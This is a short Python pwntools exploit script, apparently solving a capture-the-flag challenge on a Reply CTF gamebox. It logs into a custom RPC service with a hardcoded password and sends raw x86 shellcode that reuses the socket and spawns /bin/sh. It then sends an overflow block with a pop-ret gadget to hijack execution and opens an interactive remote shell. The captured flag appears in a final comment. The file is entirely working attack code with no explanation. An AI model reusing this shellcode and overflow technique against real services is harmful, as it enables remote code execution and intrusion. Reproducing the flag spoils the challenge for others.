from pwn import *

if args.LOCAL:
    p = remote('localhost', 8000)
else:
    p = remote('gamebox1.reply.it', '27364')

# Password
p.readline()
p.send('JustPwnThis!\n')
p.readline()

def rpc_block(procedure, message):
    block = p32(procedure)
    block += message.ljust(0x64, b'\x00')
    return block

def rpc(procedure, message):
    log.info('Sent {}:{}'.format(hex(procedure), message[:10] + b'...'))
    p.send(rpc_block(procedure, message))

def rpc_response():
    procedure = u32(p.read(0x4))
    message = p.read(0x64)
    log.info('Received {}:{}'.format(hex(procedure), message[:10] + b'...'))
    return procedure, message

polish = 0x804a8c8

shellcode=b"\xB8\x3F\x00\x00\x00\xBB\x04\x00\x00\x00\xB9\x00\x00\x00\x00\xCD\x80\xB8\x3F\x00\x00\x00\xBB\x04\x00\x00\x00\xB9\x01\x00\x00\x00\xCD\x80\xB8\x3F\x00\x00\x00\xBB\x04\x00\x00\x00\xB9\x02\x00\x00\x00\xCD\x80\xB8\x06\x00\x00\x00\xBB\x03\x00\x00\x00\xCD\x80\x31\xD2\xB8\x0B\x00\x00\x00\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80"

rpc_response()
rpc(polish, shellcode)
rpc_response()
pop_ret = 0x0804901e
p.send(rpc_block(0x4141414, b'A'*7+p32(pop_ret)+b'B'*(0x64-4-7)) + rpc_block(pop_ret, cyclic(0x64)))
#rpc_response()

p.interactive()
# {FLG:Y0u_5ucc355fu11y_d3s3ri4l1z3d_0ut_0f_j41l!}
